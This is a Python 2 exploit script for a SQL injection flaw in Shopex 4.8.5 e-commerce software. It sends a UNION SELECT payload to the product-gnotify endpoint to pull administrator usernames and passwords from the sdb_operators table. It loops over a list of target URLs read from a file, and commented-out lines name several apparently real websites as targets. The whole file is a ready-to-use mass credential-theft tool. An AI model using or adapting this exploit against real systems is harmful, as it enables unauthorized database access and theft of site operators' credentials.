#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#Author:MXi4oyu
#Email:798033502@qq.com
#Shopex 4.8.5 SQL Injection Exp
#转载请保留版权，谢谢合作
import httplib2
from urllib import urlencode
import re
import time
import codecs

#outfile=open('result.txt','a+')
def Exp(url):
    url=url+'/?product-gnotify'
    #定义要提交的数据
    html='1 and 1=2 union select 1,2,3,4,5,6,7,8,concat(0x245E,username,0x2D3E,userpass,0x5E24),10,11,12,13,14,15,16,17,18,19,20,21,22 from sdb_operators limit 0,1'
    data={"goods[goods_id]":'3',"goods[product_id]":html}
    h = httplib2.Http('.cache')
    response,content = h.request(url, 'POST', urlencode(data),
                                 headers={'Content-Type': 'application/x-www-form-urlencoded'})
    gre=re.compile(r'\$\^(.+)?\^\$')
    s=content
    lpwd=gre.findall(s)
    if len(lpwd)==1:
        pwd=lpwd[0]
        print url+"\n"+pwd+"\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
    else:
        pass


if __name__=='__main__':
    #Exp("http://www.haamei.com/")
    #Exp("http://www.tackletalk.cn")
    #Exp("http://blessings.com.cn")
#    f=open(r"url.txt")
#    data=f.readlines()
#    for url in data:
#        print url
#        #time.sleep(3)
#        #Exp(url)
#    outfile.close()
    xxx = file("url.txt", 'r')
    for xxx_line in xxx.readlines():  #读取数据
        url=xxx_line.strip()
        print "111111"+url
        Exp(url)
